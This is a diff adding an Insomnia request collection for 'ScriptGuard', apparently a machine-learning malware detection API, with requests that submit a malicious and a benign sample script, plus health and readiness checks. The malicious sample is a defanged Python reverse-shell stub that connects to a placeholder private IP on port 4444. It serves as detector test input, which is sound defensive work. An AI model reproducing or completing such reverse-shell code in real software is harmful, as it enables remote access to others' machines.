@@ -1,0 +1,160 @@
+{
+  "_type": "export",
+  "__export_format": 4,
+  "__export_date": "2026-02-15T21:30:00.000Z",
+  "__export_source": "insomnia.desktop.app:v2023.5.8",
+  "resources": [
+    {
+      "_id": "req_scriptguard_analyze_malicious",
+      "parentId": "fld_scriptguard",
+      "modified": 1708033800000,
+      "created": 1708033800000,
+      "url": "http://127.0.0.1:8000/analyze",
+      "name": "Analyze Malicious Script (Reverse Shell)",
+      "description": "Test endpoint z przykładowym złośliwym skryptem reverse shell",
+      "method": "POST",
+      "body": {
+        "mimeType": "application/json",
+        "text": "{\n  \"script_content\": \"import socket\\nimport subprocess\\nimport os\\n\\ndef reverse_shell():\\n    # USUNIĘTO: Rzeczywisty adres IP i port atakującego\\n    # Przykład zachowania: próba połączenia z zewnętrznym serwerem\\n    try:\\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\\n        # TYLKO SYMULACJA - poniższy adres jest nieprawdziwy\\n        s.connect((\\\"192.168.1.100\\\", 4444))\\n        \\n        # Symulacja przesyłania danych\\n        s.send(b\\\"Test connection - simulated malware behavior\\\")\\n        s.close()\\n    except:\\n        pass\\n\\nif __name__ == \\\"__main__\\\":\\n    reverse_shell()\",\n  \"include_rag\": true\n}"
+      },
+      "parameters": [],
+      "headers": [
+        {
+          "name": "Content-Type",
+          "value": "application/json"
+        }
+      ],
+      "authentication": {},
+      "metaSortKey": -1708033800000,
+      "isPrivate": false,
+      "settingStoreCookies": true,
+      "settingSendCookies": true,
+      "settingDisableRenderRequestBody": false,
+      "settingEncodeUrl": true,
+      "settingRebuildPath": true,
+      "settingFollowRedirects": "global",
+      "_type": "request"
+    },
+    {
+      "_id": "req_scriptguard_analyze_benign",
+      "parentId": "fld_scriptguard",
+      "modified": 1708033900000,
+      "created": 1708033900000,
+      "url": "http://127.0.0.1:8000/analyze",
+      "name": "Analyze Benign Script (Hello World)",
+      "description": "Test endpoint z przykładowym bezpiecznym skryptem",
+      "method": "POST",
+      "body": {
+        "mimeType": "application/json",
+        "text": "{\n  \"script_content\": \"def greet(name):\\n    \\\"\\\"\\\"Simple greeting function.\\\"\\\"\\\"\\n    return f'Hello, {name}!'\\n\\nif __name__ == '__main__':\\n    print(greet('World'))\\n    print('This is a benign script.')\",\n  \"include_rag\": true\n}"
+      },
+      "parameters": [],
+      "headers": [
+        {
+          "name": "Content-Type",
+          "value": "application/json"
+        }
+      ],
+      "authentication": {},
+      "metaSortKey": -1708033900000,
+      "isPrivate": false,
+      "settingStoreCookies": true,
+      "settingSendCookies": true,
+      "settingDisableRenderRequestBody": false,
+      "settingEncodeUrl": true,
+      "settingRebuildPath": true,
+      "settingFollowRedirects": "global",
+      "_type": "request"
+    },
+    {
+      "_id": "req_scriptguard_health",
+      "parentId": "fld_scriptguard",
+      "modified": 1708034000000,
+      "created": 1708034000000,
+      "url": "http://127.0.0.1:8000/health",
+      "name": "Health Check",
+      "description": "Sprawdzenie czy API działa",
+      "method": "GET",
+      "body": {},
+      "parameters": [],
+      "headers": [],
+      "authentication": {},
+      "metaSortKey": -1708034000000,
+      "isPrivate": false,
+      "settingStoreCookies": true,
+      "settingSendCookies": true,
+      "settingDisableRenderRequestBody": false,
+      "settingEncodeUrl": true,
+      "settingRebuildPath": true,
+      "settingFollowRedirects": "global",
+      "_type": "request"
+    },
+    {
+      "_id": "req_scriptguard_ready",
+      "parentId": "fld_scriptguard",
+      "modified": 1708034100000,
+      "created": 1708034100000,
+      "url": "http://127.0.0.1:8000/ready",
+      "name": "Readiness Check",
+      "description": "Sprawdzenie czy API jest gotowe (model załadowany)",
+      "method": "GET",
+      "body": {},
+      "parameters": [],
+      "headers": [],
+      "authentication": {},
+      "metaSortKey": -1708034100000,
+      "isPrivate": false,
+      "settingStoreCookies": true,
+      "settingSendCookies": true,
+      "settingDisableRenderRequestBody": false,
+      "settingEncodeUrl": true,
+      "settingRebuildPath": true,
+      "settingFollowRedirects": "global",
+      "_type": "request"
+    },
+    {
+      "_id": "fld_scriptguard",
+      "parentId": "wrk_scriptguard",
+      "modified": 1708033700000,
+      "created": 1708033700000,
+      "name": "ScriptGuard API",
+      "description": "Endpoints dla ScriptGuard malware detection API",
+      "environment": {},
+      "environmentPropertyOrder": null,
+      "metaSortKey": -1708033700000,
+      "_type": "request_group"
+    },
+    {
+      "_id": "wrk_scriptguard",
+      "parentId": null,
+      "modified": 1708033600000,
+      "created": 1708033600000,
+      "name": "ScriptGuard",
+      "description": "ML-based Malicious Script Detection API",
+      "scope": "collection",
+      "_type": "workspace"
+    },
+    {
+      "_id": "env_scriptguard_base",
+      "parentId": "wrk_scriptguard",
+      "modified": 1708033650000,
+      "created": 1708033650000,
+      "name": "Base Environment",
+      "data": {
+        "base_url": "http://127.0.0.1:8000",
+        "api_key": ""
+      },
+      "dataPropertyOrder": {
+        "&": [
+          "base_url",
+          "api_key"
+        ]
+      },
+      "color": null,
+      "isPrivate": false,
+      "metaSortKey": 1708033650000,
+      "_type": "environment"
+    }
+  ]
+}
+
